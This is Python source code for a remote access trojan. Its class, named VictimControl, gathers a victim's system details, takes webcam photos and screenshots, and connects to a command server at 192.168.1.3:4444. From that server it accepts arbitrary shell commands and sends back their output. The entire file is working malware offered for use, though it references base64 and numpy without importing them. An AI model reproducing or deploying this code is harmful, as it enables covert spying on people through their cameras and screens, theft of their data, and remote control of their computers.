import os
import sys
import socket
import subprocess
import platform
import getpass
import uuid
import json
import time
import ctypes
import winreg
import shutil
import tempfile
import zipfile
import pyautogui
import cv2
import psutil
from threading import Thread
from cryptography.fernet import Fernet

# Configuration
C2_IP = "192.168.1.3"
C2_PORT = 4444
LOG_FILE = "victim_data.txt"
FERNET_KEY = Fernet.generate_key()

class VictimControl:
    def __init__(self):
        self.webcam_count = 0
        self.screenshot_count = 0
        self.cipher = Fernet(FERNET_KEY)

    def get_system_info(self):
        try:
            return {
                "hostname": platform.node(),
                "username": getpass.getuser(),
                "os": platform.platform(),
                "cpu": {
                    "cores": os.cpu_count(),
                    "usage": psutil.cpu_percent(interval=1)
                },
                "ram": psutil.virtual_memory()._asdict(),
                "disks": [psutil.disk_usage(part.mountpoint)._asdict() 
                         for part in psutil.disk_partitions()],
                "ip": socket.gethostbyname(socket.gethostname()),
                "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                      for ele in range(0,8*6,8)][::-1])
            }
        except Exception as e:
            return {"error": str(e)}

    def capture_webcam(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cam.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                return base64.b64encode(buffer).decode()
        except:
            return None

    def capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            buffer = np.array(screenshot)
            _, buffer = cv2.imencode('.png', buffer)
            return base64.b64encode(buffer).decode()
        except:
            return None

    def execute_command(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return result.decode(errors="ignore")
        except Exception as e:
            return str(e)

def connect_to_c2():
    rat = VictimControl()
    while True:
        try:
            with socket.socket() as s:
                s.connect((C2_IP, C2_PORT))
                s.send(json.dumps(rat.get_system_info()).encode())
                
                while True:
                    cmd = s.recv(1024).decode().strip()
                    if not cmd or cmd == "exit":
                        break
                        
                    if cmd == "webcam":
                        data = rat.capture_webcam()
                        s.send(data.encode() if data else b"WEBCAM_ERROR")
                    elif cmd == "screenshot":
                        data = rat.capture_screenshot()
                        s.send(data.encode() if data else b"SCREENSHOT_ERROR")
                    else:
                        output = rat.execute_command(cmd)
                        s.send(output.encode())
                        
        except Exception as e:
            time.sleep(30)

if __name__ == "__main__":
    connect_to_c2()
